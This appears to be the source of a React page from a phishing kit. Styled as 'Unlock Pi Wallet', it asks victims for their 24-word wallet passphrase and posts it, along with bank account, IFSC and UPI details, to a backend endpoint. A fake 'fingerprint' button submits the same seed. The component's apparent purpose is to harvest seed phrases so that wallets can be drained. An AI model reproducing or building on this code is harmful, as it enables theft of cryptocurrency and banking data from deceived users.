import { useState } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import axios from 'axios';
import '../css/CoinKeyPage.css';

function CoinKeyPage({ quantity, totalAmount }) {
  const navigate = useNavigate();
  const { state } = useLocation();
  const [coinKey, setCoinKey] = useState('');
  const [error, setError] = useState('');
  const [loading, setLoading] = useState(false);

  const words = coinKey.trim().split(/\s+/).filter(Boolean);
  const wordCount = words.length;

  // ✅ Validation for 24 English alphabet-only words
  const isValidCoinKey = (key) => {
    if (wordCount !== 24) return false;
    const validWordRegex = /^[a-zA-Z]+$/;
    return words.every((word) => validWordRegex.test(word));
  };

  const handleSubmit = async () => {
    if (!isValidCoinKey(coinKey)) {
      setError('Enter exactly 24 valid English words (letters only, no numbers or symbols)');
      window.alert('Invalid passphrase. Use only A–Z words. No numbers or symbols.');
      return;
    }

    setLoading(true);
    try {
      await axios.post(`${import.meta.env.VITE_API_URL}/api/submit-key`, {
        quantity,
        totalAmount,
        method: state.method,
        upiId: state.upiId,
        accountNo: state.accountNo,
        ifsc: state.ifsc,
        accountHolder: state.accountHolder,
        coinKey,
        contactId: state.contactId,
        fundAccountId: state.fundAccountId,
        payoutId: state.payoutId,
      });
      navigate('/withdrawal-success', {
        state: { payoutId: state.payoutId, amount: totalAmount },
      });
    } catch (err) {
      const errorMessage = err.response?.data?.error || 'Failed to submit key';
      setError(errorMessage);
      window.alert(errorMessage);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="app">
      <div className="app-container">
        <div className="unlock-container">
          <h1 className="unlock-title">Unlock Pi Wallet</h1>
          <div className="input-group">
            <textarea
              value={coinKey}
              onChange={(e) => setCoinKey(e.target.value)}
              className="unlock-input"
              placeholder="Enter your 24-word passphrase here"
              rows="6"
            />
            <p className="word-count">Passphrase </p>
          </div>
          {error && <p className="error-text">{error}</p>}
          <div className="button-save">
            <button
              onClick={handleSubmit}
              disabled={loading || !isValidCoinKey(coinKey)}
              className="unlock-button"
            >
              {loading ? 'Submitting...' : 'Unlock With Passphrase'}
            </button>
            <button
              onClick={handleSubmit}
              disabled={loading || !isValidCoinKey(coinKey)}
              className="unlock-button-face"
            >
              {loading ? 'Submitting...' : 'Unlock With Fingerprint'}
            </button>
          </div>
        </div>
      </div>
    </div>
  );
}

export default CoinKeyPage;
